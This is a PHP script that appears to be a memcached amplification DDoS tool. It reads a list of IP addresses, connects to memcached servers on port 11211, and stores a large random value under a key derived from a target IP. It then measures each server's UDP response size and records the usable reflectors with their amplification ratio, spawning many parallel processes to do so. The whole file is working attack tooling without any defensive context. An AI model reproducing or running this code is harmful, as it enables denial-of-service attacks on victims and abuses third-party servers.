<?php

include __DIR__ . "/libmemc.php";

function SetupHostServer($target, $host, $set = FALSE, $timeout = 1) {
	$m = new Memcache;
	try {
		$result = @$m->connect($host, 11211, $timeout) OR die();
		$puts = "[MemcTester] $host : connected, ";
		if ($stats = $m->getStats()) {
			$puts .= "success stats query, ";
		}
		$max = 1000000;
		$inject = random_bytes($max);
		$keys_seted = FALSE;
		if ($set == "1") {
			while ($max > 1000) {
				if ($m->set(md5($target, 0), $inject) == TRUE) {
					$keys_seted = TRUE;
					$puts .= "Key MaxSize: $max; ";
					if ($result = MemcachedUDPGet($host, $timeout, md5($target))) {
						echo "setup at $host md5($target)", PHP_EOL;
						return strlen($result);
					} else {
						$m->delete(md5($target));
						die();
					}

					break;
				} else {
					$inject = substr($inject, 1);
					$max = $max * 0.5;
					$puts .= "Size Over, try $max";
				}
			}
			if ($max <= 1000) {
				$m->delete(md5($target));
				die();
			}
		} else {
			$m->delete(md5($target));
		}
	} catch (Exception $e) {
		puts($puts);
	}
}

if (threadfound($argv) == true) {
	die(thread($argv[1], $argv[2], $argv[3], $argv[4], $argv[5]));
} else {
	$argn_invalid = FALSE;
	foreach([1,2,3,4,5] as $argn){
		if (!isset($argv[$argn])){
			$argn_invalid = TRUE;
		}
	}
	if ($argn_invalid){
		$self = basename($_SERVER["SCRIPT_FILENAME"], '.php') . '.php';
		echo "Usage: php {$self} [Target_ip] [Input.txt] [Output.txt] [Setup or unset](setup = 1,unset = 0) [Threads]",PHP_EOL;
		die(10086);
	}
	unset($argn_invalid);
	die(start_threading($argv[1], $argv[2], $argv[3], $argv[4], $argv[5]));
}

function thread($target, $ip, $output, $set) {
	//stats,Tester
	$len = SetupHostServer($target, $ip, $set, TEST_TIMEOUT);
	if ($len) {
		addentry($output, $ip);
		print($ip . " " . $len . " [x" . round($len / QUERY_LENGTH, 2) . "]\n");
	}
}

function start_threading($target, $input, $output, $set, $maxthreads) {
	$self = basename($_SERVER["SCRIPT_FILENAME"], '.php') . '.php';
	$usage = "Usage: php {$self} [Target_ip] [Input.txt] [Output.txt] [Setup or unset](setup = 1,unset = 0) [Threads]";
	$error = "";
	if (strlen($target) == 0) {
		$error = "Error: Invalid target!";
	}
	if (strlen($input) == 0) {
		$error = "Error: Invalid target!";
	}
	if (strlen($output) == 0) {
		$error .= "\nError: Invalid Filename!";
	}
	if (is_numeric($set) == false) {
		$error .= "\nError: Invalid set/unset!";
	}
	if ($maxthreads < 1 || $maxthreads > 1000) {
		$error .= "\nError: Invalid Threads!";
	}
	if (strlen($error) >= 1) {
		die($error . "\n" . $usage . "\n");
	}
	print("Setup Server : add new key md5($target)\n");
	if (filter_var($target, FILTER_VALIDATE_IP)) {
		$threads = 0;
		$threadarr = array();
		$j = 0;
		$tries = 0;
		$handle = fopen($input, "r");
		while (!feof($handle)) {
			$line = fgets($handle, 4096);
			if (preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $line, $match)) {
				//正则匹配IP
				if (filter_var($match[0], FILTER_VALIDATE_IP)) {
					//PHP带的合法IP过滤器
					$ip = $match[0];
					JMP:
					if ($threads < $maxthreads) {
						if (floor(++$tries / 100) * 100 == $tries) {
							echo "$tries tests" . PHP_EOL;
						}

						$pipe[$j] = popen("php {$self} {$target} {$ip} {$output} {$set} THREAD", 'w'); //('php' . ' ' . $self . ' ' . $ip . ' ' . $output . ' ' . $responselength . ' ' . 'THREAD')
						$threadarr[] = $j;
						$j++; //$j = $j + 1;
						$threads++; //$threads = $threads + 1;
					} else {
						usleep(50000);
						foreach ($threadarr as $index) {
							pclose($pipe[$index]);
							$threads--; //$threads = $threads - 1;
						}
						$j = 0;
						unset($threadarr);
						goto JMP;
					}
				}
			}
		}
	}
	fclose($handle);
}

